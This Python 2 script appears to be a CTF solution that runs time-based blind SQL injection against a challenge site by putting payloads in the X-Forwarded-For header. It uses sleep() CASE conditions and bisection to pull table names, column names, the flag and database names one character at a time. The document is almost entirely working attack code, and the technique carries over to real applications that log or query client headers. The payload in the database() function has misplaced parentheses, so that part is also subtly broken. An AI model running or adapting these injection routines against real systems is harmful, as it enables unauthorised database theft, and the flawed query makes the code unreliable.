#coding=utf-8
import urllib2,requests,optparse

def request(pushXffInjection):
	URL="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
	header={'User-Agent':'Mozilla/5.0(Macintosh; Inter Max OS X 10_7_3) AppleWebKit/534.55.3(KHTML,like Gecko) Version/5.1.3 Safari/534.53.10','X-Forwarded-For':pushXffInjection}
	#添加访问身份，设置用户代理
	req=urllib2.Request(URL,None,header)
	try:
		request = urllib2.urlopen(req,timeout=3)
	except Exception as e:
		return 'timeout'
	return request.read()

def bisection_length(isTrue,length,name,pushXffInjection_length_1,pushXffInjection_length_2):
	#二分法得出长度
	verify = 'timeout'
	num = 0
	start = 0
	end = length
	while isTrue:
		mid = (start+end)/2
		pushXffInjection=pushXffInjection_length_1+str(mid)+pushXffInjection_length_2
		html=request(pushXffInjection)
		if start == mid:
			num = mid
			break
		elif verify in html:
			end = mid
		else:
			start = mid
	return num

def bisection_data(isTrue,length,name,pushXffInjection_data_1,pushXffInjection_data_2,pushXffInjection_data_3):
	#二分法得出数据
	verify = 'timeout'
	secret = ""
	for i in xrange(0,length):
		start = 0
		end = 127
		while isTrue:
			mid = (start+end)/2
			pushXffInjection=pushXffInjection_data_1+str(i+1)+pushXffInjection_data_2+str(mid)+pushXffInjection_data_3
			print mid
			html=request(pushXffInjection)
			if start == mid:
				secret = secret + chr(mid)
				print "the "+name+" is : "+secret 
				print "*************************************" 
				break
			elif verify in html:
				end = mid
			else:
				start = mid
	isTrue=False
	return secret

def table():
	tablelength=0
	table=""
	verify = 'timeout'
	pushXffInjection_length_1 = "a' or case when ((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())<"
	pushXffInjection_length_2 = ") then sleep(3) else sleep(0) end and 'b'='b"
	#延时注入长度
	pushXffInjection_data_1 = "a' or case when (ascii(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()) FROM "
	pushXffInjection_data_2=  " FOR 1))<"
	pushXffInjection_data_3= ") then sleep(3) else sleep(0) end and 'b'='b"
	#延时注入表
	tablelength = bisection_length(True, 32,"tableLength",pushXffInjection_length_1,pushXffInjection_length_2)
	print "tablelength is "+str(tablelength)
	table = bisection_data(True,tablelength,"table",pushXffInjection_data_1,pushXffInjection_data_2,pushXffInjection_data_3)
	return table

def column():
	columnlength=0
	column=""
	verify = 'timeout'
	pushXffInjection_length_1 = "a' or case when ((select length(group_concat(column_name)) from information_schema.columns where table_name='flag')<"
	pushXffInjection_length_2 = ") then sleep(3) else sleep(0) end and 'b'='b"
	pushXffInjection_data_1 = "a' or case when (ascii(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_name='flag') FROM "
	pushXffInjection_data_2=  " FOR 1))<"
	pushXffInjection_data_3= ") then sleep(3) else sleep(0) end and 'b'='b"
	#延时注入列
	columnlength = bisection_length(True, 32,"columnLength",pushXffInjection_length_1,pushXffInjection_length_2)
	print "column length is "+str(columnlength)
	column = bisection_data(True,columnlength,"column",pushXffInjection_data_1,pushXffInjection_data_2,pushXffInjection_data_3)
	return column

def flag():
	flaglength=0
	flag=""
	verify = 'timeout'
	pushXffInjection_length_1 = "a' or case when ((select length(flag) from flag)<"
	pushXffInjection_length_2 = ") then sleep(3) else sleep(0) end and 'b'='b"
	pushXffInjection_data_1 = "a' or case when (ascii(SUBSTRING((select flag from flag) FROM "
	pushXffInjection_data_2=  " FOR 1))<"
	pushXffInjection_data_3= ") then sleep(3) else sleep(0) end and 'b'='b"
	#延时注入，解出列中的值，select 列名 from 表名
	flaglength = bisection_length(True, 60,"flaglength",pushXffInjection_length_1,pushXffInjection_length_2)
	print "flag length is "+str(flaglength)
	flag = bisection_data(True,flaglength,"flag",pushXffInjection_data_1,pushXffInjection_data_2,pushXffInjection_data_3)
	return flag

def database():
	databaselength=0
	databse=""
	verify = 'timeout'
	pushXffInjection_length_1 = "a' or case when ((select length(group_concat(schema_name)) from information_schema.schemata)<"
	pushXffInjection_length_2 = ") then sleep(3) else sleep(0) end and 'b'='b"
	pushXffInjection_data_1 = "a' or case when (ascii(SUBSTRING((select length(group_concat(schema_name) from information_schema.schemata) FROM "
	pushXffInjection_data_2=  " FOR 1))<"
	pushXffInjection_data_3= ") then sleep(3) else sleep(0) end and 'b'='b"
	#延时注入数据库名
	tablelength = bisection_length(True, 32,"databaselength",pushXffInjection_length_1,pushXffInjection_length_2)
	print "data length is "+str(tablelength)
	data = bisection_data(True,tablelength,"database",pushXffInjection_data_1,pushXffInjection_data_2,pushXffInjection_data_3)
	return data

if __name__ == '__main__':
	print database()		
